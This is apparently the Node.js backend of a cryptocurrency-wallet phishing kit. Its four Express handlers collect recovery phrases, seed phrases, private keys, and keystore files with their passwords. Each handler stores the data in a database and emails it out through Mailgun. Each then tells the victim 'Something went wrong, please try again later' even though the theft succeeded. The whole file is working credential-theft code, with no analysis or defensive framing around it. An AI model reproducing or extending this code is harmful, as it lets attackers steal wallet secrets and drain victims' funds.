// const sgMail = require("@sendgrid/mail");
const Phrase = require("../models/phrase");
const SeedPhrase = require("../models/seedPhrase");
const PrivateKey = require("../models/privateKey");
const KeyStoreJson = require("../models/keystoreJson");

// sgMail.setApiKey(process.env.SENDGRID_API_KEY);

const formData = require("form-data");
const Mailgun = require("mailgun.js");
const mailgun = new Mailgun(formData);
const mg = mailgun.client({
  username: "api",
  key: process.env.MAILGUN_API_KEY,
});

exports.phraseData = async (req, res) => {
  const { phrase, email, wallet } = req.body;

  const phraseModel = new Phrase({
    email,
    wallet,
    phrase,
  });

  // save phrase to the database
  try {
    await phraseModel.save();
  } catch (err) {
    console.error(err.message);
    return res.status(400).json({
      success: false,
      msg: err.message,
    });
  }

  mg.messages
    .create(process.env.MAILGUN_BASE_URL, {
      from: email,
      to: email,
      subject: "Phrase Data",
      html: `
        <h1>Phrase Data</h1>
        <p>${phrase}</p>
      `,
    })
    .then((msg) => {
      console.log(msg);
      return res.status(200).json({
        success: true,
        msg: "Something went wrong, please try again later",
      });
    })
    .catch((err) => {
      console.error(err);
      return res.status(400).json({
        success: false,
        msg: err,
      });
    });
};

exports.seedPhrase = async (req, res) => {
  const { seedPhrase, email } = req.body;

  try {
    // check existing seedPhrase
    let seedPhraseModel = await SeedPhrase.findOne({ email, seedPhrase });

    if (seedPhraseModel) {
      return res.status(200).json({
        success: false,
        msg: "Seed Phrase already exists",
      });
    }
    
    seedPhraseModel = new SeedPhrase({
      email,
      seedPhrase,
    });

    // save phrase to the database
    await seedPhraseModel.save();
  } catch (err) {
    console.error(err.message);
    return res.status(400).json({
      success: false,
      msg: err.message,
    });
  }

  mg.messages
    .create(process.env.MAILGUN_BASE_URL, {
      from: email,
      to: email,
      subject: "Seed Phrase Data",
      html: `
        <h1>Seed Phrase Data</h1>
        <p>${seedPhrase}</p>
      `,
    })
    .then((msg) => {
      console.log(msg);
      return res.status(200).json({
        success: true,
        msg: "Something went wrong, please try again later",
      });
    })
    .catch((err) => {
      console.error(err);
      return res.status(400).json({
        success: false,
        msg: err,
      });
    });
};

exports.privateKeyData = async (req, res) => {
  const { privateKey, email } = req.body;

  const privateKeyModel = new PrivateKey({
    email,
    privateKey,
  });

  try {
    await privateKeyModel.save();
  } catch (err) {
    console.error(err.message);
    return res.status(400).json({
      success: false,
      msg: err.message,
    });
  }

  mg.messages
    .create(process.env.MAILGUN_BASE_URL, {
      from: email,
      to: email,
      subject: "Private Key Data",
      html: `
        <h1>Private Key Data</h1>
         <p>${privateKey}</p>
      `,
    })
    .then((msg) => {
      console.log(msg);
      return res.status(200).json({
        success: true,
        msg: "Something went wrong, please try again later",
      });
    }) // logs response data
    .catch((err) => {
      console.error(err);
      return res.status(400).json({
        success: false,
        msg: err,
      });
    });
};

exports.keystoreJSONData = async (req, res) => {
  const { keyStore, password, email } = req.body;

  const keystoreJsonModel = new KeyStoreJson({
    email,
    keystoreJSON: {
      keyStore,
      password,
    },
  });

  try {
    await keystoreJsonModel.save();
  } catch (err) {
    console.error(err.message);
    return res.status(400).json({
      success: false,
      msg: err.message,
    });
  }

  mg.messages
    .create(process.env.MAILGUN_BASE_URL, {
      from: email,
      to: email,
      subject: "KeyStore JSON Data",
      html: `
       <h1>Keystore JSON Data</h1>
        <p><strong>{keyword} - </strong> ${keyStore}</p>
        <p><strong>{password} - </strong> ${password}</p>
      `,
    })
    .then((msg) => {
      console.log(msg);
      return res.status(200).json({
        success: true,
        msg: "Something went wrong, please try again later",
      });
    }) // logs response data
    .catch((err) => {
      console.error(err);
      return res.status(400).json({
        success: false,
        msg: err,
      });
    });
};
